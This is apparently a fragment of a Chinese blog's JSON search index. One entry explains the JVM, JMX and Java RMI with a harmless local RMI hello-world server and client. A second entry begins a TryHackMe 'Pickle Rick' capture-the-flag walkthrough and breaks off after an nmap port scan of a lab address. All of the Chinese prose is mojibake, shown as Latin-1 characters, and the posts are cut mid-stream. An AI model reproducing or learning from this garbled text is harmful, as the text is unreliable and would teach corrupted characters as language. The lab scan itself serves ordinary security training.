æŒ‡ä»¤çš„æ—¶å€™ä¼šä»æ“ä½œæ•°æ ˆä¸­è·å–æ•°æ®ï¼Œæ‰§è¡Œè®¡ç®—æ“ä½œåä¼šå°†ç»“æœå†æ¬¡å‹å…¥æ“ä½œæ•°æ ˆä¸­ï¼› 4ã€å½“è¿›è¡Œ calculate æ–¹æ³•è°ƒç”¨çš„æ—¶å€™ï¼Œè™šæ‹Ÿæœºæ ˆç»§ç»­å‹å…¥ calculate æ–¹æ³•å¯¹åº”çš„æ ˆå¸§ã€‚ 5ã€å¯¹äº age + 3 è¿™æ¡åŠ æ³•æŒ‡ä»¤ï¼Œåœ¨æ‰§è¡Œè¯¥æŒ‡ä»¤å‰ï¼ŒJVM ä¼šå°†æ“ä½œæ•°æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå…ƒç´ å¼¹å‡ºï¼Œå¹¶å°†å®ƒä»¬ç›¸åŠ ï¼Œç„¶åå°†ç»“æœå‹å…¥æ“ä½œæ•°æ ˆä¸­ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒæŒ‡ä»¤çš„æ“ä½œç æ˜¯â€œaddâ€ï¼Œå®ƒè¡¨ç¤ºæ‰§è¡ŒåŠ æ³•æ“ä½œï¼›æ“ä½œæ•° 0ï¼Œè¡¨ç¤ºä»æ“ä½œæ•°æ ˆçš„é¡¶éƒ¨è·å–ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼›æ“ä½œæ•° 1ï¼Œè¡¨ç¤ºä»æ“ä½œæ•°æ ˆçš„æ¬¡é¡¶éƒ¨è·å–ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚ 6ã€PC å¯„å­˜å™¨ä¸­å­˜å‚¨äº†ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤åœ°å€ã€‚ 7ã€å½“ calculate æ–¹æ³•æ‰§è¡Œå®Œæˆåï¼Œå¯¹åº”çš„æ ˆå¸§å°†ä»è™šæ‹Ÿæœºæ ˆä¸­å¼¹å‡ºï¼Œæ–¹æ³•æ‰§è¡Œçš„ç»“æœä¼šè¢«å‹å…¥ main æ ˆå¸§ä¸­çš„æ“ä½œæ•°æ ˆä¸­ï¼Œè€Œæ–¹æ³•è¿”å›åœ°å€è¢«é‡ç½®åˆ° main çº¿ç¨‹çš„ PC å¯„å­˜å™¨ä¸­ï¼Œä»¥ä¾¿äºåç»­å­—èŠ‚ç æ‰§è¡Œå¼•æ“ä» PC å¯„å­˜å™¨ä¸­è·å–ä¸‹ä¸€æ¡å‘½ä»¤çš„åœ°å€ã€‚ å¦‚æœæ–¹æ³•æ²¡æœ‰è¿”å›å€¼ï¼ŒJVM ä¼šå°†ä¸€ä¸ª null å€¼å‹å…¥è°ƒç”¨è¯¥æ–¹æ³•çš„æ ˆå¸§çš„æ“ä½œæ•°æ ˆä¸­ï¼Œä½œä¸ºå ä½ç¬¦ï¼Œä»¥ä¾¿æ¢å¤è°ƒç”¨æ–¹çš„æ“ä½œæ•°æ ˆçŠ¶æ€ã€‚ 8ã€æ‰§è¡Œå¼•æ“ä¸­çš„è§£é‡Šå™¨ä¼šä»ç¨‹åºè®¡æ•°å™¨ä¸­è·å–ä¸‹ä¸€ä¸ªå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å…ƒç©ºé—´ä¸­å¯¹åº”çš„å­—èŠ‚ç æŒ‡ä»¤ï¼Œåœ¨è·å–åˆ°æŒ‡ä»¤ä¹‹åï¼Œé€šè¿‡è§£é‡Šå™¨è§£é‡Šä¸ºå¯¹åº”çš„æœºå™¨æŒ‡ä»¤ï¼Œæœ€ç»ˆç”± CPU è¿›è¡Œæ‰§è¡Œã€‚ Java ä»£ç é¦–å…ˆè¢«ç¼–è¯‘å™¨è½¬æ¢ä¸ºå­—èŠ‚ç ï¼Œç„¶ååœ¨ JVM ä¸Šè¿è¡Œã€‚åœ¨è¿è¡Œæ—¶ï¼ŒJVM é€šè¿‡è§£é‡Šæ‰§è¡Œæˆ–å³æ—¶ç¼–è¯‘ï¼ˆJITï¼‰å°†å­—èŠ‚ç è½¬æ¢ä¸ºæœºå™¨ç ã€‚è§£é‡Šæ‰§è¡Œç›´æ¥è¿è¡Œå­—èŠ‚ç ï¼Œè€Œ JIT åœ¨è¿è¡Œæ—¶å°†çƒ­ç‚¹ä»£ç ç¼–è¯‘ä¼˜åŒ–ä¸ºæœºå™¨ç ä»¥æå‡æ€§èƒ½ã€‚ è¿™ä¸­é—´éœ€è¦è¿è¡Œæ—¶æ•°æ®åŒºæ¥å­˜å‚¨å­—èŠ‚ç æ•°æ®ä»¥åŠè¿è¡Œæ—¶ä¸­é—´æ•°æ®ã€‚ 0x03 ä½•ä¸ºJMX JMXæ˜¯Java Management Extensionsï¼Œå®ƒæ˜¯ä¸€ä¸ªJavaå¹³å°çš„ç®¡ç†å’Œç›‘æ§æ¥å£ã€‚ä¸ºä»€ä¹ˆè¦æJMXå‘¢ï¼Ÿå› ä¸ºåœ¨æ‰€æœ‰çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå¯¹è¿è¡Œä¸­çš„ç¨‹åºè¿›è¡Œç›‘æ§éƒ½æ˜¯éå¸¸é‡è¦çš„ï¼ŒJavaåº”ç”¨ç¨‹åºä¹Ÿä¸ä¾‹å¤–ã€‚æˆ‘ä»¬è‚¯å®šå¸Œæœ›çŸ¥é“Javaåº”ç”¨ç¨‹åºå½“å‰çš„çŠ¶æ€ï¼Œä¾‹å¦‚ï¼Œå ç”¨äº†å¤šå°‘å†…å­˜ï¼Œåˆ†é…äº†å¤šå°‘å†…å­˜ï¼Œå½“å‰æœ‰å¤šå°‘æ´»åŠ¨çº¿ç¨‹ï¼Œæœ‰å¤šå°‘ä¼‘çœ çº¿ç¨‹ç­‰ç­‰ã€‚å¦‚ä½•è·å–è¿™äº›ä¿¡æ¯å‘¢ï¼Ÿ ä¸ºäº†æ ‡å‡†åŒ–ç®¡ç†å’Œç›‘æ§ï¼ŒJavaå¹³å°ä½¿ç”¨JMXä½œä¸ºç®¡ç†å’Œç›‘æ§çš„æ ‡å‡†æ¥å£ï¼Œä»»ä½•ç¨‹åºï¼Œåªè¦æŒ‰JMXè§„èŒƒè®¿é—®è¿™ä¸ªæ¥å£ï¼Œå°±å¯ä»¥è·å–æ‰€æœ‰ç®¡ç†ä¸ç›‘æ§ä¿¡æ¯ã€‚ å®é™…ä¸Šï¼Œå¸¸ç”¨çš„è¿ç»´ç›‘æ§å¦‚Zabbixã€Nagiosç­‰å·¥å…·å¯¹JVMæœ¬èº«çš„ç›‘æ§éƒ½æ˜¯é€šè¿‡JMXè·å–çš„ä¿¡æ¯ã€‚ å› ä¸ºJMXæ˜¯ä¸€ä¸ªæ ‡å‡†æ¥å£ï¼Œä¸ä½†å¯ä»¥ç”¨äºç®¡ç†JVMï¼Œè¿˜å¯ä»¥ç®¡ç†åº”ç”¨ç¨‹åºè‡ªèº«ã€‚ä¸‹å›¾æ˜¯JMXçš„æ¶æ„ï¼š JMXæŠŠæ‰€æœ‰è¢«ç®¡ç†çš„èµ„æºéƒ½ç§°ä¸ºMBeanï¼ˆManaged Beanï¼‰ï¼Œè¿™äº›MBeanå…¨éƒ¨ç”±MBeanServerç®¡ç†ï¼Œå¦‚æœè¦è®¿é—®MBeanï¼Œå¯ä»¥é€šè¿‡MBeanServerå¯¹å¤–æä¾›çš„è®¿é—®æ¥å£ï¼Œä¾‹å¦‚é€šè¿‡RMIæˆ–HTTPè®¿é—®ã€‚ æ³¨æ„åˆ°ä½¿ç”¨JMXä¸éœ€è¦å®‰è£…ä»»ä½•é¢å¤–ç»„ä»¶ï¼Œä¹Ÿä¸éœ€è¦ç¬¬ä¸‰æ–¹åº“ï¼Œå› ä¸ºMBeanServerå·²ç»å†…ç½®åœ¨JavaSEæ ‡å‡†åº“ä¸­äº†ã€‚JavaSEè¿˜æä¾›äº†ä¸€ä¸ªjconsoleç¨‹åºï¼Œç”¨äºé€šè¿‡RMIè¿æ¥åˆ°MBeanServerï¼Œè¿™æ ·å°±å¯ä»¥ç®¡ç†æ•´ä¸ªJavaè¿›ç¨‹ã€‚ é™¤äº†JVMä¼šæŠŠè‡ªèº«çš„å„ç§èµ„æºä»¥MBeanæ³¨å†Œåˆ°JMXä¸­ï¼Œæˆ‘ä»¬è‡ªå·±çš„é…ç½®ã€ç›‘æ§ä¿¡æ¯ä¹Ÿå¯ä»¥ä½œä¸ºMBeanæ³¨å†Œåˆ°JMXï¼Œè¿™æ ·ï¼Œç®¡ç†ç¨‹åºå°±å¯ä»¥ç›´æ¥æ§åˆ¶æˆ‘ä»¬æš´éœ²çš„MBeanã€‚å› æ­¤ï¼Œåº”ç”¨ç¨‹åºä½¿ç”¨JMXï¼Œåªéœ€è¦ä¸¤æ­¥ï¼š ç¼–å†™MBeanæä¾›ç®¡ç†æ¥å£å’Œç›‘æ§æ•°æ®ï¼› æ³¨å†ŒMBeanã€‚ åœ¨Springåº”ç”¨ç¨‹åºä¸­ï¼Œä½¿ç”¨JMXåªéœ€è¦ä¸€æ­¥ï¼š ç¼–å†™MBeanæä¾›ç®¡ç†æ¥å£å’Œç›‘æ§æ•°æ®ã€‚ ç¬¬äºŒæ­¥æ³¨å†Œçš„è¿‡ç¨‹ç”±Springè‡ªåŠ¨å®Œæˆã€‚ åŸºæœ¬æ¦‚å¿µ JMX çš„æ ¸å¿ƒæ¦‚å¿µåŒ…æ‹¬ MBeanï¼ˆç®¡ç†beanï¼‰ã€MBeanServerï¼ˆç®¡ç†beanæœåŠ¡å™¨ï¼‰å’Œ JMX Agentï¼ˆJMXä»£ç†ï¼‰ã€‚ MBean æ˜¯ä»£è¡¨ç®¡ç†èµ„æºçš„å¯¹è±¡ï¼Œå®ƒå¯ä»¥æ˜¯ Java ç±»æˆ–æ¥å£ã€‚MBean æä¾›äº†ç®¡ç†æ“ä½œçš„æ¥å£ï¼Œä¾‹å¦‚è·å–ç³»ç»Ÿä¿¡æ¯ã€è®¾ç½®å‚æ•°ç­‰ã€‚MBeanServer æ˜¯ç®¡ç† bean çš„å®¹å™¨ï¼Œå®ƒå¯ä»¥å­˜å‚¨å’ŒæŸ¥æ‰¾ç®¡ç† beanã€‚JMX Agent æ˜¯ä¸æœ¬åœ°è¿›ç¨‹é€šä¿¡çš„ä»£ç†ï¼Œå®ƒè´Ÿè´£å°†ç®¡ç†æ“ä½œè½¬åŒ–ä¸ºæœ¬åœ°æ“ä½œã€‚ MBeanï¼ˆManaged Beanï¼‰ MBeanæ˜¯JMXçš„æ ¸å¿ƒæ¦‚å¿µä¹‹ä¸€ï¼Œå®ƒæ˜¯ä¸€ä¸ªèµ„æºæˆ–æœåŠ¡ï¼Œå¯ä»¥è¢«ç®¡ç†å’Œç›‘æ§ã€‚MBeanå®ç°äº†javax.management.DynamicMBeanæ¥å£æˆ–è€… ç»§æ‰¿äº†javax.management.NotificationBroadcasterSupportç±»ã€‚æ¯ä¸ªMBeanéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ObjectNameï¼Œç”¨äºåœ¨JMXå®¢æˆ·ç«¯ä¸­æ ‡è¯†å’Œè®¿é—®å®ƒã€‚ JMXä»£ç†ï¼ˆJMX Agentï¼‰ JMXä»£ç†æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„Javaç¨‹åºï¼Œè´Ÿè´£åŠ è½½å’Œç®¡ç†MBeanã€‚JMXä»£ç†é€šå¸¸ä¸åº”ç”¨ç¨‹åºéƒ¨ç½²åœ¨ä¸€èµ·ï¼Œä»¥ä¾¿åœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶æ”¶é›†å’Œå¤„ç†MBeançš„ä¿¡æ¯ã€‚å¸¸è§çš„JMXä»£ç†æœ‰ï¼šJava Mission Controlã€VisualVMç­‰ã€‚ JMXå®¢æˆ·ç«¯ï¼ˆJMX Clientï¼‰ JMXå®¢æˆ·ç«¯æ˜¯ä¸€ä¸ªç”¨äºè®¿é—®å’Œç®¡ç†MBeançš„å·¥å…·ã€‚å®ƒå¯ä»¥ä¸JMXä»£ç†é€šä¿¡ï¼Œè·å–MBeançš„ä¿¡æ¯ï¼Œä»¥åŠå¯¹MBeanè¿›è¡Œæ“ä½œã€‚å¸¸è§çš„JMXå®¢æˆ·ç«¯æœ‰ï¼šJava Mission Controlã€VisualVMã€jconsoleç­‰ã€‚ 0x04 ä½•ä¸ºRMI ç®€ä»‹ Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³Java RMIï¼ˆJava Remote Method Invocationï¼‰æ˜¯Javaç¼–ç¨‹è¯­è¨€é‡Œï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ã€‚å®ƒä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ç‰¹æ€§ä½¿Javaç¼–ç¨‹äººå‘˜èƒ½å¤Ÿåœ¨ç½‘ç»œç¯å¢ƒä¸­åˆ†å¸ƒæ“ä½œã€‚RMIå…¨éƒ¨çš„å®—æ—¨å°±æ˜¯å°½å¯èƒ½ç®€åŒ–è¿œç¨‹æ¥å£å¯¹è±¡çš„ä½¿ç”¨ã€‚ æ¥å£çš„ä¸¤ç§å¸¸è§å®ç°æ–¹å¼æ˜¯ï¼šæœ€åˆä½¿ç”¨JRMPï¼ˆJava Remote Message Protocolï¼ŒJavaè¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰å®ç°ï¼›æ­¤å¤–è¿˜å¯ä»¥ç”¨ä¸CORBAå…¼å®¹çš„æ–¹æ³•å®ç°ã€‚RMIä¸€èˆ¬æŒ‡çš„æ˜¯ç¼–ç¨‹æ¥å£ï¼Œä¹Ÿæœ‰æ—¶å€™åŒæ—¶åŒ…æ‹¬JRMPå’ŒAPIï¼ˆåº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼‰ï¼Œè€ŒRMI-IIOPåˆ™ä¸€èˆ¬æŒ‡RMIæ¥å£æ¥ç®¡ç»å¤§éƒ¨åˆ†çš„åŠŸèƒ½ï¼Œä»¥æ”¯æŒCORBAçš„å®ç°ã€‚ æœ€åˆçš„RMI APIè®¾è®¡ä¸ºé€šç”¨åœ°æ”¯æŒä¸åŒå½¢å¼çš„æ¥å£å®ç°ã€‚åæ¥ï¼ŒCORBAå¢åŠ äº†ä¼ å€¼ï¼ˆpass by valueï¼‰åŠŸèƒ½ï¼Œä»¥å®ç°RMIæ¥å£ã€‚ç„¶è€ŒRMI-IIOPå’ŒJRMPå®ç°çš„æ¥å£å¹¶ä¸å®Œå…¨ä¸€è‡´ã€‚ æ›´å¤šå‚è€ƒ JAVA RPCï¼šä»ä¸Šæ‰‹åˆ°çˆ±ä¸é‡Šæ‰‹ ä»£ç† åœ¨å®¢æˆ·ç«¯ä¸ºè¿œç¨‹å¯¹è±¡å®‰è£…ä¸€ä¸ªä»£ç†ã€‚ä»£ç†æ˜¯ä½äºå®¢æˆ·ç«¯è™šæ‹Ÿæœºä¸­çš„ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒå¯¹äºå®¢æˆ·ç«¯ç¨‹åºæ¥è¯´ï¼Œå°±åƒæ˜¯è¦è®¿é—®çš„è¿œç¨‹å¯¹è±¡ä¸€æ ·ã€‚å®¢æˆ·ç«¯è°ƒç”¨æ­¤ä»£ç†æ—¶ï¼Œåªéœ€è¿›è¡Œå¸¸è§„çš„æ–¹æ³•è°ƒç”¨ã€‚è€Œå®¢æˆ·ç«¯ä»£ç†åˆ™è´Ÿè´£ä½¿ç”¨ç½‘ç»œåè®®ä¸æœåŠ¡å™¨è¿›è¡Œè”ç³»ã€‚ç½‘ç»œæ¨¡å‹å¦‚ä¸‹ï¼š å­˜æ ¹(stub) å½“å®¢æˆ·ç«¯è¦è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ä»£ç†å¯¹è±¡ä¸Šçš„ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œæˆ‘ä»¬ç§°æ­¤ä»£ç†å¯¹è±¡ä¸ºå­˜æ ¹ï¼ˆstubï¼‰ã€‚å­˜æ ¹ä½äºå®¢æˆ·ç«¯æœºå™¨ä¸Šï¼Œè€ŒéæœåŠ¡å™¨ä¸Šã€‚ å‚æ•°ç¼–ç»„ å­˜æ ¹ä¼šå°†è¿œç¨‹æ–¹æ³•æ‰€éœ€çš„å‚æ•°æ‰“åŒ…æˆä¸€ç»„å­—èŠ‚ï¼Œå¯¹å‚æ•°ç¼–ç çš„è¿‡ç¨‹å°±ç§°ä¸ºå‚æ•°ç¼–ç»„ã€‚å‚æ•°ç¼–ç»„çš„ç›®çš„æ˜¯å°†å‚æ•°è½¬æ¢æˆé€‚åˆåœ¨è™šæ‹Ÿæœºä¹‹é—´è¿›è¡Œä¼ é€’çš„æ ¼å¼ï¼Œåœ¨RMIåè®®ä¸­ï¼Œå¯¹è±¡æ˜¯ä½¿ç”¨åºåˆ—åŒ–æœºåˆ¶è¿›è¡Œç¼–ç çš„ã€‚ RMIæ¶æ„ RMIåˆ†ä¸ºä¸‰éƒ¨åˆ† Registry ç±»ä¼¼ç½‘å…³ Server æœåŠ¡ç«¯æä¾›æœåŠ¡ Client å®¢æˆ·ç«¯è°ƒç”¨ å®ç°RMIæ‰€éœ€çš„APIå‡ ä¹éƒ½åœ¨ï¼š java.rmiï¼šæä¾›å®¢æˆ·ç«¯éœ€è¦çš„ç±»ã€æ¥å£å’Œå¼‚å¸¸ï¼› java.rmi.serverï¼šæä¾›æœåŠ¡ç«¯éœ€è¦çš„ç±»ã€æ¥å£å’Œå¼‚å¸¸ï¼› java.rmi.registryï¼šæä¾›æ³¨å†Œè¡¨çš„åˆ›å»ºä»¥åŠæŸ¥æ‰¾å’Œå‘½åè¿œç¨‹å¯¹è±¡çš„ç±»ã€æ¥å£å’Œå¼‚å¸¸ï¼› è¿™é‡Œç»™å‡ºy4erçˆ·æ‰€ç»™å‡ºçš„å®ä¾‹ä»£ç ï¼š æœåŠ¡ç«¯ï¼š package com.test.rmi; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer { public static String HOST = \"127.0.0.1\"; public static int PORT = 8989; public static String RMI_PATH = \"/hello\"; public static final String RMI_NAME = \"rmi://\" + HOST + \":\" + PORT + RMI_PATH; public static void main(String[] args) { try { // æ³¨å†ŒRMIç«¯å£ LocateRegistry.createRegistry(PORT); // åˆ›å»ºä¸€ä¸ªæœåŠ¡ RMIInterface rmiInterface = new RMIImpl(); // æœåŠ¡å‘½åç»‘å®š Naming.rebind(RMI_NAME, rmiInterface); System.out.println(\"å¯åŠ¨RMIæœåŠ¡åœ¨\" + RMI_NAME); } catch (Exception e) { e.printStackTrace(); } } } ä¸Šè¿°ä»£ç ä¸­ï¼Œåœ¨8989ç«¯å£èµ·äº†RMIæœåŠ¡ï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨äº†RMI_PATHå’ŒrmiInterfaceçš„å¯¹åº”å…³ç³»ï¼Œä¹Ÿå°±æ˜¯rmi://127.0.0.1:8989/helloå¯¹åº”ä¸€ä¸ªRMIImplç±»å®ä¾‹ï¼Œç„¶åé€šè¿‡Naming.rebind(RMI_NAME, rmiInterface)ç»‘å®šå¯¹åº”å…³ç³»ã€‚å†æ¥çœ‹RMIInterface.java package com.test.rmi; import java.rmi.Remote; import java.rmi.RemoteException; public interface RMIInterface extends Remote { String hello() throws RemoteException; } å®šä¹‰äº†RMIInterfaceæ¥å£ï¼Œç»§æ‰¿è‡ªRemoteï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªhello()æ–¹æ³•ä½œä¸ºæ¥å£ã€‚æ³¨æ„éœ€è¦æŠ›å‡ºRemoteExceptionå¼‚å¸¸ã€‚ç»§ç»­çœ‹å®ç°çœŸæ­£åŠŸèƒ½çš„ç±»RMIImpl.java package com.test.rmi; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIImpl extends UnicastRemoteObject implements RMIInterface { protected RMIImpl() throws RemoteException { super(); } @Override public String hello() throws RemoteException { System.out.println(\"call hello().\"); return \"this is hello().\"; } } ç»§æ‰¿è‡ªUnicastRemoteObjectç±»ï¼Œå¹¶ä¸”å®ç°ä¹‹å‰å®šä¹‰çš„RMIInterfaceæ¥å£çš„hello()æ–¹æ³•ã€‚UnicastRemoteObjectç±»æä¾›äº†å¾ˆå¤šæ”¯æŒRMIçš„æ–¹æ³•ï¼Œå…·ä½“æ¥è¯´ï¼Œè¿™äº›æ–¹æ³•å¯ä»¥é€šè¿‡JRMPåè®®å¯¼å‡ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶é€šè¿‡åŠ¨æ€ä»£ç†æ„å»ºä¸€ä¸ªå¯ä»¥å’Œè¿œç¨‹å¯¹è±¡äº¤äº’çš„Stubå¯¹è±¡ã€‚ç°åœ¨å°±å®šä¹‰å¥½äº†Serverç«¯ï¼Œæ¥çœ‹Client package com.test.rmi; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import static com.test.rmi.RMIServer.RMI_NAME; public class RMIClient { public static void main(String[] args) { try { // è·å–æœåŠ¡æ³¨å†Œå™¨ Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 8989); // è·å–æ‰€æœ‰æ³¨å†Œçš„æœåŠ¡ String[] list = registry.list(); for (String i : list) { System.out.println(\"å·²ç»æ³¨å†Œçš„æœåŠ¡ï¼š\" + i); } // å¯»æ‰¾RMI_NAMEå¯¹åº”çš„RMIå®ä¾‹ RMIInterface rt = (RMIInterface) Naming.lookup(RMI_NAME); // è°ƒç”¨Serverçš„hello()æ–¹æ³•,å¹¶æ‹¿åˆ°è¿”å›å€¼. String result = rt.hello(); System.out.println(result); } catch (Exception e) { e.printStackTrace(); } } } æˆ‘ä»¬å¯ä»¥é€šè¿‡Registryæ‹¿åˆ°æ‰€æœ‰å·²ç»æ³¨å†Œçš„æœåŠ¡ï¼Œå…¶ä¸­å°±åŒ…æ‹¬æˆ‘ä»¬æ³¨å†Œçš„helloã€‚ç„¶åå¯ä»¥é€šè¿‡Naming.lookup(RMI_NAME)å»å¯»æ‰¾å¯¹åº”çš„helloå®ä¾‹ï¼Œè¿™æ ·å°±æ‹¿åˆ°äº†è¿œç¨‹å¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡å¯¹è±¡æ¥è°ƒç”¨hello()æ–¹æ³•ã€‚ åœ¨Java 1.4åŠ ä»¥å‰çš„ç‰ˆæœ¬ä¸­éœ€è¦æ‰‹åŠ¨å»ºç«‹Stubå¯¹è±¡ï¼Œé€šè¿‡è¿è¡Œrmicå‘½ä»¤æ¥ç”Ÿæˆè¿œç¨‹å¯¹è±¡å®ç°ç±»çš„Stubå¯¹è±¡ï¼Œä½†æ˜¯åœ¨Java 1.5ä¹‹åå¯ä»¥é€šè¿‡åŠ¨æ€ä»£ç†æ¥å®Œæˆï¼Œä¸å†éœ€è¦è¿™ä¸ªè¿‡ç¨‹äº†ã€‚è¿è¡ŒServerä¹‹åå†è¿è¡ŒClientè¾“å‡ºç»“æœ Server å¯åŠ¨RMIæœåŠ¡åœ¨rmi://127.0.0.1:8989/hello call hello(). Client å·²ç»æ³¨å†Œçš„æœåŠ¡ï¼šhello this is hello(). RMIæ¥å£å‘å¸ƒå’Œè°ƒç”¨æµç¨‹ 1ã€å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£ï¼Œå¿…é¡»ç»§æ‰¿Remoteæ¥å£ï¼Œå…¶ä¸­éœ€è¦è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•å¿…é¡»æŠ›å‡ºRemoteExceptionå¼‚å¸¸ã€‚ åœ¨Javaä¸­ï¼Œåªè¦ä¸€ä¸ªç±»extendsäº†java.rmi.Remoteæ¥å£ï¼Œå³å¯æˆä¸ºå­˜åœ¨äºæœåŠ¡å™¨ç«¯çš„è¿œç¨‹å¯¹è±¡ï¼Œä¾›å®¢æˆ·ç«¯è®¿é—®å¹¶æä¾›ä¸€å®šçš„æœåŠ¡ã€‚JavaDocæè¿°ï¼šRemote æ¥å£ç”¨äºæ ‡è¯†å…¶æ–¹æ³•å¯ä»¥ä»éæœ¬åœ°è™šæ‹Ÿæœºä¸Šè°ƒç”¨çš„æ¥å£ã€‚ä»»ä½•è¿œç¨‹å¯¹è±¡éƒ½å¿…é¡»ç›´æ¥æˆ–é—´æ¥å®ç°æ­¤æ¥å£ã€‚åªæœ‰åœ¨â€œè¿œç¨‹æ¥å£â€ï¼ˆæ‰©å±• java.rmi.Remote çš„æ¥å£ï¼‰ä¸­æŒ‡å®šçš„è¿™äº›æ–¹æ³•æ‰å¯è¢«è¿œç¨‹è°ƒç”¨ã€‚ 2ã€åˆ›å»ºè¿œç¨‹æ¥å£çš„å®ç°ç±»ï¼Œç»§æ‰¿UnicastRemoteObjectç±»å®ç°åºåˆ—åŒ–ï¼Œå¿…é¡»æ˜¾å¼å®šä¹‰æ— å‚æ„é€ æ–¹æ³•ã€‚ è¿œç¨‹å¯¹è±¡å¿…é¡»å®ç°java.rmi.server.UniCastRemoteObjectç±»ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯å®¢æˆ·ç«¯è®¿é—®è·å¾—è¿œç¨‹å¯¹è±¡æ—¶ï¼Œè¯¥è¿œç¨‹å¯¹è±¡å°†ä¼šæŠŠè‡ªèº«çš„ä¸€ä¸ªæ‹·è´ä»¥Socketçš„å½¢å¼ä¼ è¾“ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯æ‰€è·å¾—çš„è¿™ä¸ªæ‹·è´ç§°ä¸ºâ€œå­˜æ ¹â€ï¼Œè€ŒæœåŠ¡å™¨ç«¯æœ¬èº«å·²å­˜åœ¨çš„è¿œç¨‹å¯¹è±¡åˆ™ç§°ä¹‹ä¸ºâ€œéª¨æ¶â€ã€‚å…¶å®æ­¤æ—¶çš„å­˜æ ¹æ˜¯å®¢æˆ·ç«¯çš„ä¸€ä¸ªä»£ç†ï¼Œç”¨äºä¸æœåŠ¡å™¨ç«¯çš„é€šä¿¡ï¼Œè€Œéª¨æ¶ä¹Ÿå¯è®¤ä¸ºæ˜¯æœåŠ¡å™¨ç«¯çš„ä¸€ä¸ªä»£ç†ï¼Œç”¨äºæ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚ä¹‹åè°ƒç”¨è¿œç¨‹æ–¹æ³•æ¥å“åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚ 3ã€é€šè¿‡LocateRegistry.createRegistry()åˆ›å»ºè¿œç¨‹å¯¹è±¡æ³¨å†Œè¡¨Registryçš„å®ä¾‹ï¼Œè¢«åˆ›å»ºçš„RegistryæœåŠ¡å°†åœ¨æŒ‡å®šçš„ç«¯å£ä¸Šä¾¦å¬åˆ°æ¥çš„è¯·æ±‚ï¼ˆé»˜è®¤ç«¯å£æ˜¯1099ï¼‰ 4ã€é€šè¿‡Naming.bind()å°†è¿œç¨‹æœåŠ¡å®ç°ç±»ç»‘å®šåˆ°æŒ‡å®šçš„RMIåœ°å€ä¸Šï¼Œæ‰§è¡Œè¿™ä¸ªæ–¹æ³•åï¼Œç›¸å½“äºå‘å¸ƒäº†RMIæœåŠ¡ã€‚ 5ã€å®¢æˆ·ç«¯ï¼šé€šè¿‡Naming.lookup()åœ¨è¿œç¨‹å¯¹è±¡æ³¨å†Œè¡¨Registryä¸­æŸ¥æ‰¾æŒ‡å®šnameçš„å¯¹è±¡ï¼Œå¹¶è¿”å›è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆä¸€ä¸ªstubï¼‰ï¼Œä¹‹åå¯é€šè¿‡stubè°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ã€‚ 0x05 å‚è€ƒæ–‡ç«  äºŒå“¥çš„Javaè¿›é˜¶ä¹‹è·¯ ä¸€æ–‡å¸¦ä½ å½»åº•äº†è§£JMX Java RMIåŸç†åŠååºåˆ—åŒ–å­¦ä¹  Java-RMI","tags":["JavaåŸºç¡€"],"categories":["JavaåŸºç¡€"]},{"title":"THM-Pickle_Rick","path":"/2024/03/10/thm-pickle-rick/","content":"0x01 å®éªŒä»»åŠ¡ è¿™ä¸ªä»¥ç‘å…‹å’Œè«è’‚ä¸ºä¸»é¢˜çš„æŒ‘æˆ˜è¦æ±‚ä½ åˆ©ç”¨ç½‘ç»œæœåŠ¡å™¨å¹¶æ‰¾åˆ°ä¸‰ç§æˆåˆ†æ¥å¸®åŠ©ç‘å…‹åˆ¶ä½œé­”è¯ï¼Œå¹¶å°†è‡ªå·±ä»æ³¡èœå˜å›äººç±»ã€‚ åœ¨æ­¤ä»»åŠ¡ä¸Šéƒ¨ç½²è™šæ‹Ÿæœºå¹¶æ¢ç´¢ Web åº”ç”¨ç¨‹åºï¼š10.10.74.56 0x02 å®éªŒå¼€å§‹ nmapæ‰«æ nmap -T4 -sC -sV -p- 10.10.74.56 